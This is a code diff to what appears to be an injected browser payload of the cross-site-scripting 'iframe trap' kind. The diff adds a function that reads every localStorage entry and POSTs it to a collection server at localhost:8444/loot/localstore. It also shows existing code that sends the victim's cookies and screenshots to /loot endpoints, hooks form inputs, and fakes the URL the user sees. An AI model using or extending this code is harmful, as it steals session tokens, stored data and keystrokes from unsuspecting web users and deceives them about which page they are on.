@@ -34,7 +34,11 @@ let loaded = false;
 var sessionName = "";
 
 // Cookie storage
-var cookieStorage ={};
+var cookieStorageDict ={};
+
+
+// Local storage
+var localStorageDict = {};
 
 
 // Values for client session identifiers
@@ -150,7 +154,7 @@ function sendScreenshot()
 			console.log(this.responseText)
 		};
 
-		console.log("About to send image....");
+		//console.log("About to send image....");
 		request = new XMLHttpRequest();request.addEventListener("load", responseHandler);
 		request.open("POST", "http://localhost:8444/loot/screenshot/" + sessionName);
 
@@ -208,7 +212,7 @@ function hookInputs()
 
 
 // Check for cookies, see if values
-// have been added changed
+// have been added or changed
 // Only update backend if new cookie or value changed.
 function checkCookies()
 {
@@ -223,39 +227,92 @@ function checkCookies()
 		cookieName = cookieData[0];
 		cookieValue = cookieData[1];
 		// console.log("!!!!!   Checking cookies for: " + cookieName + ", " + cookieValue);
-		if (cookieName in cookieStorage)
+		if (cookieName in cookieStorageDict)
 		{
 			// console.log("== Existing cookie: " + cookieName);
-			if (cookieStorage[cookieName] != cookieValue)
+			if (cookieStorageDict[cookieName] != cookieValue)
 			{
+				// Existing cookie, but the value has changed
 				// console.log("     New cookie value: " + cookieValue);
-				// console.log("     Old cookie value: " + cookieStorage[cookieName]);
-				cookieStorage[cookieName] = cookieValue;
+				// console.log("     Old cookie value: " + cookieStorageDict[cookieName]);
+				cookieStorageDict[cookieName] = cookieValue;
 			}
 			else
 			{
+				// Existing cookie, but no change in value to report
 				// console.log("     Cookie value unchanged");
 				continue;
 			}
 		}
-		else
+		else 
 		{
+			// New cookie detected
 			// console.log("++ New cookie: " + cookieName + ", with value: " + cookieValue);
-			cookieStorage[cookieName] = cookieValue;
+			cookieStorageDict[cookieName] = cookieValue;
 		}
 
+		// Ship it
 		request = new XMLHttpRequest();
 		request.open("POST", "http://localhost:8444/loot/dessert/" + sessionName);
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 		var jsonObj = new Object();
-		jsonObj["cookieName"] = cookieData[0];
-		jsonObj["cookieValue"] = cookieData[1];
+		jsonObj["cookieName"] = cookieName;
+		jsonObj["cookieValue"] = cookieValue;
 		var jsonString = JSON.stringify(jsonObj);
 		request.send(jsonString);
 	}
-
 }
 
+
+// Check for local storage data, see if values
+// have been added or changed
+// Only update backend if new data or value changed.
+function checkLocalStorage()
+{
+	for (index = 0; index < localStorage.length; index++)
+	{
+		key = localStorage.key(index)
+		value = localStorage.getItem(key)
+		//console.log("~~~ Local storage: {" + key + ", " + value + "}");
+
+		if (key in localStorageDict)
+		{
+			// Existing local storage key
+			//console.log("!!! Existing localstorage key...");
+			if (localStorageDict[key] != value)
+			{
+				// Existing localStorage, but the value has changed
+				// console.log("     New localStorage value: " + value);
+				// console.log("     Old localStorage value: " + localStorageDict[key]);
+				localStorageDict[key] = value;
+			}
+			else
+			{
+				// Existing cookie, but no change in value to report
+				//console.log("     localStorgae value unchanged");
+				continue;
+			}
+
+		}
+		else
+		{
+			// New localStorage entry
+			//console.log("++ New localStorage: " + key + ", with value: " + value);
+			localStorageDict[key] = value;
+		}
+
+
+		// Ship it
+		request = new XMLHttpRequest();
+		request.open("POST", "http://localhost:8444/loot/localstore/" + sessionName);
+		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+		var jsonObj = new Object();
+		jsonObj["key"] = key;
+		jsonObj["value"] = value;
+		var jsonString = JSON.stringify(jsonObj);
+		request.send(jsonString);
+	}
+}
 
 
 // When this update fires, it checks the iframe trap URL
@@ -293,8 +350,6 @@ function runUpdate()
 		hookInputs();
 	}
 
-	// else
-	// 	console.log("Fake URL doesn't need updating");
 
 
 
@@ -308,6 +363,11 @@ function runUpdate()
 	// Handle Cookies
 	// Will only report when new cookies found, or values change. 
 	checkCookies();
+
+
+	// Check local storage
+	// Will only report when new or changed data found
+	checkLocalStorage();
 
 
 	// Fake the URL that the user sees. This is important. 
